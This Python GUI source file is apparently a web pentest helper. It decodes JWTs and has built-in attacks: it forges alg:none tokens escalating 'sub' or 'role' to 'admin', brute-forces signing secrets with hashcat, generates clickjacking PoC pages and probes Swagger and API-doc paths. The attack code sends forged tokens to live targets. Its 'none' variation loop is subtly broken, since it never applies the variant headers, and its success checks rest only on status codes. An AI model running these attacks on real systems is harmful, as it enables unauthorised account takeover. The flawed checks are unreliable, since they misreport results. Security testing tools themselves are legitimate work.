import tkinter as tk
from tkinter import ttk, messagebox, simpledialog, filedialog
import jwt
import json
import requests
import re
import subprocess
import os
from urllib.parse import urlparse, parse_qs
import base64
from datetime import datetime

class HTTPRequestTool:
    def __init__(self, root):
        self.root = root
        self.root.title("HTTP Request Tool with JWT Decoder")
        
        # Set minimum window size
        self.root.minsize(1200, 800)
        
        # Create main paned window
        self.paned = ttk.PanedWindow(root, orient=tk.HORIZONTAL)
        self.paned.pack(fill=tk.BOTH, expand=True)
        
        # Left frame for request
        self.request_frame = ttk.Frame(self.paned)
        self.paned.add(self.request_frame, weight=1)
        
        # Right frame for JWT and response
        self.response_frame = ttk.Frame(self.paned)
        self.paned.add(self.response_frame, weight=1)
        
        # Create vertical paned window for JWT and response
        self.vertical_paned = ttk.PanedWindow(self.response_frame, orient=tk.VERTICAL)
        self.vertical_paned.pack(fill=tk.BOTH, expand=True)
        
        # JWT section
        self.jwt_section = ttk.Frame(self.vertical_paned)
        self.vertical_paned.add(self.jwt_section, weight=1)
        
        # JWT header with minimize checkbox
        jwt_header = ttk.Frame(self.jwt_section)
        jwt_header.pack(fill=tk.X, pady=5)
        self.minimize_jwt = tk.BooleanVar(value=False)
        self.minimize_check = ttk.Checkbutton(jwt_header, text="Minimize", variable=self.minimize_jwt, command=self.toggle_jwt_section)
        self.minimize_check.pack(side=tk.RIGHT, padx=5)
        
        # Add edit button and secret key frame
        edit_frame = ttk.Frame(self.jwt_section)
        edit_frame.pack(fill=tk.X, pady=5)
        ttk.Label(edit_frame, text="JWT Decoded").pack(side=tk.LEFT, pady=5)
        
        # Add secret key frame
        secret_frame = ttk.Frame(edit_frame)
        secret_frame.pack(side=tk.RIGHT, padx=5)
        
        self.use_secret = tk.BooleanVar(value=False)
        self.secret_check = ttk.Checkbutton(secret_frame, text="Use Secret Key", variable=self.use_secret)
        self.secret_check.pack(side=tk.LEFT, padx=5)
        
        self.secret_entry = ttk.Entry(secret_frame, width=20)
        self.secret_entry.pack(side=tk.LEFT, padx=5)
        
        self.edit_button = ttk.Button(edit_frame, text="Edit JWT", command=self.edit_jwt)
        self.edit_button.pack(side=tk.RIGHT, padx=5)
        
        self.jwt_text = tk.Text(self.jwt_section, width=80, height=20)
        self.jwt_text.pack(padx=5, pady=5, fill=tk.BOTH, expand=True)
        
        # Response section
        self.response_section = ttk.Frame(self.vertical_paned)
        self.vertical_paned.add(self.response_section, weight=1)
        
        # Response header
        response_header = ttk.Frame(self.response_section)
        response_header.pack(fill=tk.X, pady=5)
        ttk.Label(response_header, text="Response").pack(side=tk.LEFT, pady=5)
        copy_button = ttk.Button(response_header, text="📋 Copy", command=self.copy_response)
        copy_button.pack(side=tk.RIGHT, padx=5)
        
        self.response_text = tk.Text(self.response_section, width=80, height=20)
        self.response_text.pack(padx=5, pady=5, fill=tk.BOTH, expand=True)
        
        # Request components
        ttk.Label(self.request_frame, text="HTTP Request").pack(pady=5)
        self.request_text = tk.Text(self.request_frame, width=80, height=40)
        self.request_text.pack(padx=5, pady=5, fill=tk.BOTH, expand=True)
        
        # Bind text changes to JWT detection
        self.request_text.bind('<<Modified>>', self.on_text_change)
        
        # Button frame
        button_frame = ttk.Frame(self.request_frame)
        button_frame.pack(pady=5, fill=tk.X)
        
        # Send button
        self.send_button = ttk.Button(button_frame, text="Send Request", command=self.process_request)
        self.send_button.pack(side=tk.LEFT, padx=5)
        
        # JWT Attacks button
        self.jwt_attacks_button = ttk.Button(button_frame, text="JWT Attacks", command=self.show_jwt_attacks_menu)
        self.jwt_attacks_button.pack(side=tk.LEFT, padx=5)
        
        # Clickjack button
        self.clickjack_button = ttk.Button(button_frame, text="Generate Clickjack", command=self.generate_clickjack)
        self.clickjack_button.pack(side=tk.LEFT, padx=5)
        
        # TestSSL button
        self.testssl_button = ttk.Button(button_frame, text="Run TestSSL", command=self.run_testssl)
        self.testssl_button.pack(side=tk.LEFT, padx=5)
        
        # Add Check for Common Files button
        self.check_files_button = ttk.Button(button_frame, text="Check for Common Files", command=self.check_common_files)
        self.check_files_button.pack(side=tk.LEFT, padx=5)
        
        # Add Analyze Static File button
        self.analyze_static_button = ttk.Button(button_frame, text="Analyze Static File", command=self.analyze_static_file)
        self.analyze_static_button.pack(side=tk.LEFT, padx=5)
        
        # Add proxy configuration frame
        proxy_frame = ttk.Frame(self.request_frame)
        proxy_frame.pack(fill=tk.X, pady=5)
        
        # Add proxy checkbox
        self.use_proxy = tk.BooleanVar(value=False)
        self.proxy_check = ttk.Checkbutton(proxy_frame, text="Use Burp Proxy", variable=self.use_proxy)
        self.proxy_check.pack(side=tk.LEFT, padx=5)
        
        # Add proxy address entry
        ttk.Label(proxy_frame, text="Proxy Address:").pack(side=tk.LEFT, padx=5)
        self.proxy_address = ttk.Entry(proxy_frame, width=30)
        self.proxy_address.insert(0, "http://127.0.0.1:8080")  # Default Burp proxy address
        self.proxy_address.pack(side=tk.LEFT, padx=5)
        
        # Add proxy CA cert checkbox
        self.verify_cert = tk.BooleanVar(value=False)
        self.cert_check = ttk.Checkbutton(proxy_frame, text="Verify Proxy Cert", variable=self.verify_cert)
        self.cert_check.pack(side=tk.LEFT, padx=5)

    def is_jwt(self, token):
        # Split the token into parts
        parts = token.split('.')
        
        # We only care about header and body
        if len(parts) < 2:
            return False
            
        try:
            # Check if header and body are valid base64
            for part in parts[:2]:  # Only check header and body
                if part:  # Skip empty parts
                    # Add padding if needed
                    padding = 4 - (len(part) % 4)
                    if padding != 4:
                        part += '=' * padding
                    decoded = base64.b64decode(part)
                    # Try to parse as JSON to verify structure
                    json.loads(decoded)
            return True
        except:
            return False

    def decode_jwt(self, token):
        try:
            # Split the token into parts
            parts = token.split('.')
            
            # We only care about header and body
            if len(parts) < 2:
                return "Invalid JWT format"
            
            # Decode header and body
            decoded_parts = []
            for part in parts[:2]:  # Only process header and body
                if part:
                    # Add padding if needed
                    padding = 4 - (len(part) % 4)
                    if padding != 4:
                        part += '=' * padding
                    decoded = base64.b64decode(part)
                    try:
                        # Try to parse as JSON
                        decoded_parts.append(json.loads(decoded))
                    except:
                        # If not JSON, just use the decoded string
                        decoded_parts.append(decoded.decode('utf-8'))
            
            # Format the output
            output = []
            if len(decoded_parts) >= 1:
                output.append(f"Header:\n{json.dumps(decoded_parts[0], indent=2)}")
            if len(decoded_parts) >= 2:
                output.append(f"\nPayload:\n{json.dumps(decoded_parts[1], indent=2)}")
                
            return '\n'.join(output)
        except Exception as e:
            return f"Error decoding JWT: {str(e)}"

    def encode_jwt(self, header, payload, signature=None):
        try:
            # Encode header and payload
            encoded_header = base64.urlsafe_b64encode(
                json.dumps(header).encode('utf-8')
            ).decode('utf-8').rstrip('=')
            
            encoded_payload = base64.urlsafe_b64encode(
                json.dumps(payload).encode('utf-8')
            ).decode('utf-8').rstrip('=')
            
            # Construct the token
            token_parts = [encoded_header, encoded_payload]
            if signature:
                token_parts.append(signature)
            
            return '.'.join(token_parts)
        except Exception as e:
            return f"Error encoding JWT: {str(e)}"

    def find_jwt(self, request_text):
        # Split request into words and check each for JWT pattern
        tokens = []
        seen_tokens = set()  # Track seen tokens to avoid duplicates
        
        # Find all potential JWT patterns in the text
        # This regex looks for base64 strings separated by dots, allowing for more flexible patterns
        jwt_pattern = r'(?:Bearer\s+)?([A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+(?:\.[A-Za-z0-9-_=]+)?)'
        
        # Look for JWTs in headers
        for line in request_text.split('\n'):
            # Check for Authorization header
            if 'Authorization:' in line:
                matches = re.findall(jwt_pattern, line)
                for token in matches:
                    if token not in seen_tokens and self.is_jwt(token):
                        tokens.append(token)
                        seen_tokens.add(token)
            
            # Check for Cookie header
            if 'Cookie:' in line:
                # Look for session cookies that might contain JWTs
                cookie_matches = re.findall(r'session=([^;,\s]+)', line)
                for token in cookie_matches:
                    if token not in seen_tokens and self.is_jwt(token):
                        tokens.append(token)
                        seen_tokens.add(token)
            
            # Check for other potential JWT-containing headers
            if ':' in line:
                header_value = line.split(':', 1)[1].strip()
                matches = re.findall(jwt_pattern, header_value)
                for token in matches:
                    if token not in seen_tokens and self.is_jwt(token):
                        tokens.append(token)
                        seen_tokens.add(token)
        
        # Also check the entire text for any JWTs we might have missed
        all_matches = re.findall(jwt_pattern, request_text)
        for token in all_matches:
            if token not in seen_tokens and self.is_jwt(token):
                tokens.append(token)
                seen_tokens.add(token)
        
        # Return all found JWTs
        return tokens

    def on_text_change(self, event=None):
        # Reset the modified flag
        self.request_text.edit_modified(False)
        
        # Get current text and find/decode JWTs
        request_text = self.request_text.get("1.0", tk.END).strip()
        jwt_tokens = self.find_jwt(request_text)
        
        self.jwt_text.delete("1.0", tk.END)
        if jwt_tokens:
            decoded_output = ""
            for i, token in enumerate(jwt_tokens, 1):
                decoded_output += f"JWT #{i}:\n{self.decode_jwt(token)}\n\n"
            self.jwt_text.insert("1.0", decoded_output)
        else:
            self.jwt_text.insert("1.0", "No JWT tokens found in request")

    def copy_response(self):
        response_text = self.response_text.get("1.0", tk.END).strip()
        self.root.clipboard_clear()
        self.root.clipboard_append(response_text)
        messagebox.showinfo("Success", "Content copied to clipboard!")

    def generate_clickjack(self):
        url = simpledialog.askstring("Generate Clickjack", "Enter target URL:")
        if url:
            clickjack_html = f"""<html>
   <head>
      <title>Aon Clickjacking Example PoC</title>
      <style>
         body {{
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
         }}
         .container {{
            max-width: 1200px;
            margin: 0 auto;
         }}
         h1 {{
            color: #333;
            margin-bottom: 20px;
         }}
         .iframe-container {{
            position: relative;
            width: 100%;
            height: 80vh;
         }}
         iframe {{
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0.5;
            border: 2px solid #333;
         }}
      </style>
   </head>
   <body>
      <div class="container">
         <h1>Aon Clickjacking PoC</h1>
         <div class="iframe-container">
            <iframe src="{url}"></iframe>
         </div>
      </div>
   </body>
</html>"""
            self.response_text.delete("1.0", tk.END)
            self.response_text.insert("1.0", clickjack_html)

    def process_request(self):
        request_text = self.request_text.get("1.0", tk.END).strip()
        
        try:
            # Parse the raw HTTP request
            request_lines = request_text.split('\n')
            if not request_lines:
                raise ValueError("Empty request")

            # Parse first line (method, path, version)
            method, path, *_ = request_lines[0].split()
            
            # Parse headers
            headers = {}
            current_line = 1
            while current_line < len(request_lines) and request_lines[current_line].strip():
                header_line = request_lines[current_line].strip()
                key, value = header_line.split(':', 1)
                headers[key.strip()] = value.strip()
                current_line += 1
            
            # Get body if exists (after blank line)
            body = None
            if current_line < len(request_lines):
                body = '\n'.join(request_lines[current_line + 1:]).strip()
            
            # Parse URL and enforce HTTPS
            if not path.startswith('http'):
                # If host header exists, use it to construct full URL
                host = headers.get('Host', '')
                if host:
                    # Always use HTTPS
                    path = f"https://{host}{path}"
                else:
                    raise ValueError("No host specified in headers and path is not absolute URL")
            else:
                # If URL starts with http://, change it to https://
                if path.startswith('http://'):
                    path = path.replace('http://', 'https://', 1)
            
            # Configure proxy if enabled
            proxies = None
            verify = True
            if self.use_proxy.get():
                proxy_address = self.proxy_address.get().strip()
                if not proxy_address:
                    messagebox.showerror("Error", "Please enter a proxy address")
                    return
                proxies = {
                    'http': proxy_address,
                    'https': proxy_address
                }
                verify = self.verify_cert.get()
            
            # Send the request
            response = requests.request(
                method=method,
                url=path,
                headers=headers,
                data=body,
                verify=verify,
                proxies=proxies,
                allow_redirects=False  # Don't follow redirects to see the actual response
            )
            
            # Format response
            response_text = f"HTTP/{response.raw.version / 10.0} {response.status_code} {response.reason}\n"
            for key, value in response.headers.items():
                response_text += f"{key}: {value}\n"
            response_text += f"\n{response.text}"
            
            self.response_text.delete("1.0", tk.END)
            self.response_text.insert("1.0", response_text)
            
        except Exception as e:
            self.response_text.delete("1.0", tk.END)
            self.response_text.insert("1.0", f"Error processing request: {str(e)}")

    def run_testssl(self):
        domain = simpledialog.askstring("TestSSL", "Enter domain to test:")
        if domain:
            try:
                # Store current directory
                current_dir = os.getcwd()
                
                # Change to testssl directory
                os.chdir('testssl')
                
                # Make sure testssl.sh is executable
                os.chmod('testssl.sh', 0o755)
                
                # Run testssl.sh with HTML output using system OpenSSL
                result = subprocess.run(
                    ['./testssl.sh', '--html', domain],
                    capture_output=True,
                    text=True
                )
                
                # Change back to original directory
                os.chdir(current_dir)
                
                # Display the output in the response text area
                self.response_text.delete("1.0", tk.END)
                self.response_text.insert("1.0", f"TestSSL Results for {domain}:\n\n{result.stdout}")
                
                if result.stderr:
                    self.response_text.insert(tk.END, f"\n\nErrors:\n{result.stderr}")
                
                messagebox.showinfo("TestSSL", f"TestSSL scan completed for {domain}")
            except Exception as e:
                # Make sure we change back to original directory even if there's an error
                os.chdir(current_dir)
                messagebox.showerror("Error", f"Failed to run TestSSL: {str(e)}")

    def toggle_jwt_section(self):
        if self.minimize_jwt.get():
            self.jwt_text.pack_forget()
        else:
            self.jwt_text.pack(padx=5, pady=5, fill=tk.BOTH, expand=True)

    def show_jwt_attacks_menu(self):
        # Create a new window for JWT attacks
        attack_window = tk.Toplevel(self.root)
        attack_window.title("JWT Attacks")
        attack_window.geometry("400x300")
        
        # Create a frame for attack options
        attack_frame = ttk.Frame(attack_window)
        attack_frame.pack(padx=10, pady=10, fill=tk.BOTH, expand=True)
        
        # Add attack options
        self.unverified_sig_var = tk.BooleanVar()
        ttk.Checkbutton(attack_frame, text="Unverified Signature Attack", variable=self.unverified_sig_var).pack(anchor=tk.W, pady=5)
        
        self.none_sig_var = tk.BooleanVar()
        ttk.Checkbutton(attack_frame, text="None Signature Attack", variable=self.none_sig_var).pack(anchor=tk.W, pady=5)
        
        self.brute_force_var = tk.BooleanVar()
        ttk.Checkbutton(attack_frame, text="Brute Force Secret Key", variable=self.brute_force_var).pack(anchor=tk.W, pady=5)
        
        # Add button to manage secrets list
        ttk.Button(attack_frame, text="Manage Secrets List", command=self.manage_secrets_list).pack(pady=5)
        
        # Add run button
        ttk.Button(attack_frame, text="Run Selected Attacks", command=lambda: self.run_jwt_attacks(attack_window)).pack(pady=10)

    def manage_secrets_list(self):
        # Create window for managing secrets
        secrets_window = tk.Toplevel(self.root)
        secrets_window.title("Manage JWT Secrets")
        secrets_window.geometry("600x400")
        
        # Create main frame
        main_frame = ttk.Frame(secrets_window)
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Create text area for secrets
        secrets_frame = ttk.LabelFrame(main_frame, text="JWT Secrets List")
        secrets_frame.pack(fill=tk.BOTH, expand=True, pady=5)
        
        secrets_text = tk.Text(secrets_frame, wrap=tk.WORD)
        secrets_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Load existing secrets if file exists
        secrets_path = 'jwt_secrets/jwt.secrets.list'
        if os.path.exists(secrets_path):
            with open(secrets_path, 'r') as f:
                secrets_text.insert("1.0", f.read())
        else:
            messagebox.showerror("Error", f"Secrets file not found at {secrets_path}")
            secrets_window.destroy()
            return
        
        # Add buttons frame
        buttons_frame = ttk.Frame(main_frame)
        buttons_frame.pack(fill=tk.X, pady=5)
        
        def save_secrets():
            try:
                with open(secrets_path, 'w') as f:
                    f.write(secrets_text.get("1.0", tk.END).strip())
                messagebox.showinfo("Success", "Secrets list saved successfully")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to save secrets list: {str(e)}")
        
        ttk.Button(buttons_frame, text="Save Changes", command=save_secrets).pack(side=tk.LEFT, padx=5)

    def run_jwt_attacks(self, attack_window):
        if self.unverified_sig_var.get():
            self.perform_unverified_signature_attack()
        if self.none_sig_var.get():
            self.perform_none_signature_attack()
        if self.brute_force_var.get():
            self.perform_brute_force_attack()
        attack_window.destroy()

    def perform_unverified_signature_attack(self):
        # Get the current request text
        request_text = self.request_text.get("1.0", tk.END).strip()
        
        # Find JWT tokens in the request
        jwt_tokens = self.find_jwt(request_text)
        if not jwt_tokens:
            messagebox.showerror("Error", "No JWT tokens found in request")
            return
        
        # Get the first JWT token
        original_token = jwt_tokens[0]
        
        try:
            # Decode the JWT without verification
            header = jwt.get_unverified_header(original_token)
            payload = jwt.decode(original_token, options={"verify_signature": False})
            
            # Modify a value in the payload (e.g., change 'sub' to 'admin' if it exists)
            if 'sub' in payload:
                payload['sub'] = 'admin'
            elif 'role' in payload:
                payload['role'] = 'admin'
            else:
                # If no obvious fields to modify, add a new one
                payload['modified'] = 'true'
            
            # Create a new token with the modified payload
            # We don't need to sign it since we're testing unverified signature
            modified_token = jwt.encode(payload, "", algorithm="none")
            
            # Replace the original token in the request
            modified_request = request_text.replace(original_token, modified_token)
            
            # Send the modified request
            self.request_text.delete("1.0", tk.END)
            self.request_text.insert("1.0", modified_request)
            self.process_request()
            
            # Get the response status code from the response text
            response_text = self.response_text.get("1.0", tk.END)
            status_line = response_text.split('\n')[0]
            try:
                status_code = int(status_line.split()[1])
            except (IndexError, ValueError):
                status_code = 0
            
            # Check if the status code indicates failure (400 or 500 series)
            if status_code >= 400:
                messagebox.showinfo("Attack Result", "Unverified Signature Attack: ❌ FAILED")
            else:
                messagebox.showinfo("Attack Result", "Unverified Signature Attack: ✅ SUCCESS")
                
        except Exception as e:
            messagebox.showerror("Error", f"Failed to perform attack: {str(e)}")

    def perform_none_signature_attack(self):
        # Get the current request text
        request_text = self.request_text.get("1.0", tk.END).strip()
        
        # Find JWT tokens in the request
        jwt_tokens = self.find_jwt(request_text)
        if not jwt_tokens:
            messagebox.showerror("Error", "No JWT tokens found in request")
            return
        
        # Get the first JWT token
        original_token = jwt_tokens[0]
        
        try:
            # Decode the JWT without verification
            header = jwt.get_unverified_header(original_token)
            payload = jwt.decode(original_token, options={"verify_signature": False})
            
            # Try different variations of "none"
            none_variations = ["none", "None", "NONE", "nOnE"]
            success = False
            successful_variation = None
            
            for variation in none_variations:
                # Create a new header with the current variation
                new_header = header.copy()
                new_header["alg"] = variation
                
                # Create a new token with the modified header
                modified_token = jwt.encode(payload, "", algorithm="none")
                
                # Replace the original token in the request
                modified_request = request_text.replace(original_token, modified_token)
                
                # Send the modified request
                self.request_text.delete("1.0", tk.END)
                self.request_text.insert("1.0", modified_request)
                self.process_request()
                
                # Get the response status code from the response text
                response_text = self.response_text.get("1.0", tk.END)
                status_line = response_text.split('\n')[0]
                try:
                    status_code = int(status_line.split()[1])
                except (IndexError, ValueError):
                    status_code = 0
                
                # If we get a success response, keep this variation
                if status_code < 400:
                    success = True
                    successful_variation = variation
                    break
            
            if success:
                messagebox.showinfo("Attack Result", f"None Signature Attack: ✅ SUCCESS\nSuccessful variation: {successful_variation}")
            else:
                messagebox.showinfo("Attack Result", "None Signature Attack: ❌ FAILED\nAll variations failed")
                
        except Exception as e:
            messagebox.showerror("Error", f"Failed to perform attack: {str(e)}")

    def perform_brute_force_attack(self):
        # Get the current request text
        request_text = self.request_text.get("1.0", tk.END).strip()
        
        # Find JWT tokens in the request
        jwt_tokens = self.find_jwt(request_text)
        if not jwt_tokens:
            messagebox.showerror("Error", "No JWT tokens found in request")
            return
        
        # Get the first JWT token
        jwt_token = jwt_tokens[0]
        
        try:
            # Create a temporary file for the JWT
            with open('temp_jwt.txt', 'w') as f:
                f.write(jwt_token)
            
            # Check if hashcat is installed
            try:
                subprocess.run(['hashcat', '--version'], capture_output=True, check=True)
            except (subprocess.SubprocessError, FileNotFoundError):
                messagebox.showerror("Error", "hashcat is not installed. Please install hashcat to use this feature.")
                return
            
            # Check if jwt.secrets.list exists in jwt_secrets folder
            secrets_path = 'jwt_secrets/jwt.secrets.list'
            if not os.path.exists(secrets_path):
                messagebox.showerror("Error", f"Secrets file not found at {secrets_path}")
                return
            
            # Create results window
            results_window = tk.Toplevel(self.root)
            results_window.title("Brute Force Attack Results")
            results_window.geometry("800x600")
            
            # Create text area for output
            output_frame = ttk.Frame(results_window)
            output_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
            
            output_label = ttk.Label(output_frame, text="Hashcat Output:")
            output_label.pack(anchor=tk.W, pady=5)
            
            output_text = tk.Text(output_frame, wrap=tk.WORD)
            output_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
            
            # Add progress bar
            progress_frame = ttk.Frame(results_window)
            progress_frame.pack(fill=tk.X, padx=5, pady=5)
            
            progress_label = ttk.Label(progress_frame, text="Running hashcat...")
            progress_label.pack(side=tk.LEFT, padx=5)
            
            progress = ttk.Progressbar(progress_frame, mode='indeterminate')
            progress.pack(fill=tk.X, expand=True, padx=5)
            progress.start()
            
            def run_hashcat():
                try:
                    # Run hashcat with proper formatting and wordlist
                    result = subprocess.run(
                        ['hashcat', '-a', '0', '-m', '16500', 'temp_jwt.txt', secrets_path],
                        capture_output=True,
                        text=True
                    )
                    
                    # Update UI in main thread
                    results_window.after(0, lambda: update_output(result))
                except Exception as e:
                    results_window.after(0, lambda: show_error(str(e)))
            
            def update_output(result):
                progress.stop()
                progress.pack_forget()
                progress_label.config(text="Hashcat completed")
                
                # Display the full output
                output_text.insert("1.0", result.stdout)
                if result.stderr:
                    output_text.insert(tk.END, f"\nErrors:\n{result.stderr}")
                
                # Parse the output to find the secret
                if result.stdout:
                    # Look for the JWT in the output
                    for line in result.stdout.split('\n'):
                        if jwt_token in line:
                            # The secret should be after the JWT
                            parts = line.split(':')
                            if len(parts) > 1:
                                secret = parts[-1].strip()
                                messagebox.showinfo("Success", f"Found secret key: {secret}")
                                break
                    else:
                        messagebox.showinfo("Result", "No secret key found in the dictionary")
                
                # Clean up
                try:
                    os.remove('temp_jwt.txt')
                except:
                    pass
            
            def show_error(error):
                progress.stop()
                progress.pack_forget()
                progress_label.config(text="Error occurred")
                output_text.insert("1.0", f"Error: {error}")
                messagebox.showerror("Error", f"Failed to run hashcat: {error}")
            
            # Run hashcat in a separate thread
            import threading
            threading.Thread(target=run_hashcat, daemon=True).start()
            
        except Exception as e:
            messagebox.showerror("Error", f"Failed to perform attack: {str(e)}")

    def edit_jwt(self):
        # Get the current JWT content
        jwt_content = self.jwt_text.get("1.0", tk.END).strip()
        if not jwt_content or "No JWT tokens found" in jwt_content:
            messagebox.showinfo("Info", "No JWT to edit")
            return
            
        # Create edit window
        edit_window = tk.Toplevel(self.root)
        edit_window.title("Edit JWT")
        edit_window.geometry("400x500")
        
        # Parse current JWT content
        try:
            header_start = jwt_content.find("Header:") + 7
            header_end = jwt_content.find("Payload:")
            payload_start = header_end + 8
            
            header_json = json.loads(jwt_content[header_start:header_end].strip())
            payload_json = json.loads(jwt_content[payload_start:].strip())
            
            # Create a frame for each part
            header_frame = ttk.LabelFrame(edit_window, text="Header")
            header_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
            header_text = tk.Text(header_frame, width=40, height=5)
            header_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
            header_text.insert("1.0", json.dumps(header_json, indent=2))
            
            payload_frame = ttk.LabelFrame(edit_window, text="Payload")
            payload_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
            payload_text = tk.Text(payload_frame, width=40, height=5)
            payload_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
            payload_text.insert("1.0", json.dumps(payload_json, indent=2))
            
            def save_changes():
                try:
                    # Get edited content
                    new_header = json.loads(header_text.get("1.0", tk.END).strip())
                    new_payload = json.loads(payload_text.get("1.0", tk.END).strip())
                    
                    # Get the original request
                    original_request = self.request_text.get("1.0", tk.END)
                    
                    # Find the JWT token in the request
                    original_token = None
                    
                    # List of headers that might contain JWTs
                    jwt_headers = [
                        ('Authorization', 'Bearer '),
                        ('Cookie', 'session='),
                        ('Cookie', 'token='),
                        ('Cookie', 'jwt='),
                        ('X-Auth-Token', ''),
                        ('X-JWT-Token', ''),
                        ('X-Access-Token', ''),
                        ('X-Token', '')
                    ]
                    
                    # First try to find in common headers
                    for line in original_request.split('\n'):
                        for header, prefix in jwt_headers:
                            if line.startswith(f"{header}:"):
                                value = line.split(':', 1)[1].strip()
                                if prefix:
                                    if prefix in value:
                                        original_token = value.split(prefix)[1].strip()
                                        break
                                else:
                                    original_token = value.strip()
                                    break
                        if original_token:
                            break
                    
                    # If not found in headers, look for any JWT pattern in the request
                    if not original_token:
                        jwt_pattern = r'[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]*'
                        matches = re.findall(jwt_pattern, original_request)
                        if matches:
                            original_token = matches[0]
                    
                    # Create a new token
                    if self.use_secret.get():
                        secret_key = self.secret_entry.get().strip()
                        if not secret_key:
                            messagebox.showerror("Error", "Please enter a secret key")
                            return
                        
                        # Get algorithm from the original token's header
                        try:
                            original_header = jwt.get_unverified_header(original_token)
                            algorithm = original_header.get('alg', 'HS256')
                        except:
                            algorithm = 'HS256'  # Default if we can't get the original algorithm
                        
                        # Check if algorithm uses a secret key
                        if algorithm in ['HS256', 'HS384', 'HS512']:
                            new_token = jwt.encode(
                                new_payload,
                                secret_key,
                                algorithm=algorithm,
                                headers=new_header
                            )
                        else:
                            messagebox.showerror("Error", f"Algorithm {algorithm} does not use a secret key for signing.\nOnly HS256, HS384, and HS512 are supported for secret key signing.")
                            return
                    else:
                        # If not using secret key, just use the algorithm from the header
                        try:
                            original_header = jwt.get_unverified_header(original_token)
                            algorithm = original_header.get('alg', 'none')
                        except:
                            algorithm = 'none'  # Default if we can't get the original algorithm
                        
                        # For non-secret key algorithms, just use the original algorithm
                        new_token = jwt.encode(
                            new_payload,
                            "",  # Empty secret for unsigned token
                            algorithm=algorithm,
                            headers=new_header
                        )
                    
                    if original_token:
                        # Replace the token in the request
                        updated_request = original_request.replace(original_token, new_token)
                    else:
                        # If no JWT found, add it to Authorization header
                        if 'Authorization:' not in original_request:
                            # Find the first line after the request line
                            lines = original_request.split('\n')
                            if len(lines) > 1:
                                # Insert Authorization header after the first line
                                lines.insert(1, f"Authorization: Bearer {new_token}")
                                updated_request = '\n'.join(lines)
                            else:
                                # If only one line, add header after it
                                updated_request = f"{original_request}\nAuthorization: Bearer {new_token}"
                        else:
                            # Replace existing Authorization header
                            updated_request = re.sub(
                                r'Authorization:.*',
                                f'Authorization: Bearer {new_token}',
                                original_request
                            )
                    
                    # Update the request text
                    self.request_text.delete("1.0", tk.END)
                    self.request_text.insert("1.0", updated_request)
                    
                    edit_window.destroy()
                    # Trigger text change to update decoded view
                    self.on_text_change()
                except Exception as e:
                    messagebox.showerror("Error", f"Failed to save changes: {str(e)}")
            
            # Add buttons frame
            buttons_frame = ttk.Frame(edit_window)
            buttons_frame.pack(fill=tk.X, pady=10)
            
            # Make buttons more prominent
            save_button = ttk.Button(buttons_frame, text="Save Changes", command=save_changes, width=15)
            save_button.pack(side=tk.LEFT, padx=5, expand=True)
            
        except Exception as e:
            messagebox.showerror("Error", f"Failed to parse JWT: {str(e)}")
            return

    def check_common_files(self):
        # Get current request text
        request_text = self.request_text.get("1.0", tk.END).strip()
        
        try:
            # Parse the request to get the base URL
            request_lines = request_text.split('\n')
            if not request_lines:
                messagebox.showerror("Error", "No request found")
                return
            
            # Get the first line (method and path)
            first_line = request_lines[0].split()
            if len(first_line) < 2:
                messagebox.showerror("Error", "Invalid request format")
                return
            
            # Get the full URL
            full_url = first_line[1]
            if not full_url.startswith('http'):
                # If host header exists, use it to construct full URL
                host = None
                for line in request_lines[1:]:
                    if line.lower().startswith('host:'):
                        host = line.split(':', 1)[1].strip()
                        break
                
                if not host:
                    messagebox.showerror("Error", "Could not determine host")
                    return
                
                # Always use HTTPS
                full_url = f"https://{host}{full_url}"
            
            # Parse URL to get base
            parsed_url = urlparse(full_url)
            base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
            
            # List of common sensitive files to check
            sensitive_files = [
                # API Documentation and Swagger paths
                '/api-docs',
                '/api-docs.json',
                '/api-docs.yaml',
                '/api-docs.yml',
                '/swagger',
                '/swagger.json',
                '/swagger.yaml',
                '/swagger.yml',
                '/swagger-ui',
                '/swagger-ui.html',
                '/swagger-ui/index.html',
                '/swagger-resources',
                '/swagger-resources/configuration/ui',
                '/swagger-resources/configuration/security',
                '/v2/api-docs',
                '/v3/api-docs',
                '/v1/api-docs',
                '/v1/swagger.json',
                '/v2/swagger.json',
                '/v3/swagger.json',
                '/api/swagger.json',
                '/api/v1/swagger.json',
                '/api/v2/swagger.json',
                '/api/v3/swagger.json',
                '/api/swagger.yaml',
                '/api/v1/swagger.yaml',
                '/api/v2/swagger.yaml',
                '/api/v3/swagger.yaml',
                '/api/swagger.yml',
                '/api/v1/swagger.yml',
                '/api/v2/swagger.yml',
                '/api/v3/swagger.yml',
                '/api/swagger',
                '/api/v1/swagger',
                '/api/v2/swagger',
                '/api/v3/swagger',
                '/api/swagger-ui',
                '/api/v1/swagger-ui',
                '/api/v2/swagger-ui',
                '/api/v3/swagger-ui',
                '/api/swagger-ui.html',
                '/api/v1/swagger-ui.html',
                '/api/v2/swagger-ui.html',
                '/api/v3/swagger-ui.html',
                '/api/swagger-resources',
                '/api/v1/swagger-resources',
                '/api/v2/swagger-resources',
                '/api/v3/swagger-resources',
                '/api/swagger-resources/configuration/ui',
                '/api/v1/swagger-resources/configuration/ui',
                '/api/v2/swagger-resources/configuration/ui',
                '/api/v3/swagger-resources/configuration/ui',
                '/api/swagger-resources/configuration/security',
                '/api/v1/swagger-resources/configuration/security',
                '/api/v2/swagger-resources/configuration/security',
                '/api/v3/swagger-resources/configuration/security',
                '/docs',
                '/docs/api',
                '/docs/api-docs',
                '/docs/swagger',
                '/docs/swagger-ui',
                '/docs/swagger-ui.html',
                '/documentation',
                '/documentation/api',
                '/documentation/api-docs',
                '/documentation/swagger',
                '/documentation/swagger-ui',
                '/documentation/swagger-ui.html',
                '/apidocs',
                '/apidocs/api',
                '/apidocs/api-docs',
                '/apidocs/swagger',
